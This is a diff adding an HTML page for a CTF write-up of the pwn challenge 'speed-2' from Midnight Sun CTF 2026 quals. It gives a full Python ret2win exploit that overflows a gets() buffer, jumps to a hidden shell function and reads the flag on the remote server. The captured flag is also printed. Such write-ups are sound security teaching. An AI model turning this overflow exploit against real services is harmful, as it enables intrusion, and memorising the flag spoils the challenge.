@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>speed-2 | W4llz Writeups</title>
+  <link rel="stylesheet" href="/public/writeups.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;900&family=Space+Grotesk:wght@400;700;900&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="scanlines"></div>
+  <div class="glow-orb one"></div>
+  <div class="glow-orb two"></div>
+
+  <div class="site-shell">
+    <nav class="site-nav">
+      <div class="nav-inner">
+        <a class="brand" href="/">
+          <div class="brand-mark">W</div>
+          <div class="brand-text">
+            <div class="brand-name">W4llz</div>
+            <div class="brand-subtitle">CTF Writeups</div>
+          </div>
+        </a>
+        <div class="nav-links">
+          <a href="/">Home</a>
+          <a href="/c/midnight-sun-ctf-2026-quals/">Competitions</a>
+          <a href="https://github.com/z68d/z68d.github.io">GitHub</a>
+        </div>
+      </div>
+    </nav>
+
+    <main class="container">
+      
+<div class="topbar"><a href="/c/midnight-sun-ctf-2026-quals/cat/pwn/">← Back to category</a></div>
+<section class="hero compact">
+  <div class="hero-grid"></div>
+  <div class="hero-content">
+    <div class="eyebrow"><span class="pulse-dot"></span> writeup</div>
+    <h1>speed-2</h1>
+    <p>First three flags get podium points, everyone else gets 50.</p>
+  </div>
+</section>
+
+<div class="writeup-page">
+  <div class="writeup-card">
+    
+<div class="overview-grid">
+  <div><span>Name:</span> speed-2</div>
+  <div><span>Author:</span> @tor</div>
+  <div><span>Category:</span> pwn</div>
+  <div><span>Flag format:</span> midnight{...}</div>
+  <div><span>Objective:</span> Exploit the binary to execute the hidden shell function and read the flag from the remote server.</div>
+</div>
+
+  </div>
+
+  <article class="writeup-card prose">
+    <h1>speed-2</h1>
+<h2>Challenge Overview</h2>
+<p>Name: speed-2</p>
+<p>Author: @tor</p>
+<p>Category: pwn</p>
+<p>Description: First three flags get podium points, everyone else gets 50.</p>
+<p>Flag format: midnight{...}</p>
+<p>Objective: Exploit the binary to execute the hidden shell function and read the flag from the remote server.</p>
+<h2>Files Provided</h2>
+<ul>
+<li>speed2-f8bb12.tar.gz</li>
+</ul>
+<h2>Solution Plan</h2>
+<p>1. Inspect the binary and identify the vulnerable input function.</p>
+<p>2. Calculate the overflow offset to control RIP and locate the hidden win/shell function.</p>
+<p>3. Send a ret2win payload to spawn a shell, then read <code>/home/ctf/flag</code>.</p>
+<h2>Code (Exploit Script)</h2>
+<pre><code class="language-bash">cat &gt; solve_speed2_flag.py &lt;&lt;&#x27;PY&#x27;
+#!/usr/bin/env python3
+import socket
+import struct
+import time
+
+HOST = &quot;speed2.play.ctf.se&quot;
+PORT = 6161
+
+RET = 0x401124
+WIN = 0x4011d6
+
+payload = b&quot;A&quot; * 40
+payload += struct.pack(&quot;&lt;Q&quot;, RET)
+payload += struct.pack(&quot;&lt;Q&quot;, WIN)
+payload += b&quot;\n&quot;
+
+s = socket.create_connection((HOST, PORT), timeout=5)
+
+time.sleep(0.2)
+try:
+    s.recv(4096)
+except Exception:
+    pass
+
+s.sendall(payload)
+time.sleep(0.2)
+
+s.sendall(b&quot;cat /home/ctf/flag\n&quot;)
+time.sleep(0.5)
+
+s.settimeout(2)
+out = b&quot;&quot;
+while True:
+    try:
+        chunk = s.recv(4096)
+        if not chunk:
+            break
+        out += chunk
+    except Exception:
+        break
+
+print(out.decode(&quot;latin-1&quot;, errors=&quot;ignore&quot;))
+PY
+
+python3 solve_speed2_flag.py</code></pre>
+<h2>Flag</h2>
+<pre><code class="language-txt">midnight{e44a230e3fc7aadde716339cdea5d8cc}</code></pre>
+<h2>Notes</h2>
+<p>The binary used <code>gets</code> on a small stack buffer, allowing control of RIP after 40 bytes. The exploit returns first to a <code>ret</code> gadget for stack alignment, then jumps to the hidden win/shell function at <code>0x4011d6</code>. The remote shell revealed that the flag path was <code>/home/ctf/flag</code>.</p>
+  </article>
+</div>
+
+    </main>
+  </div>
+</body>
+</html>
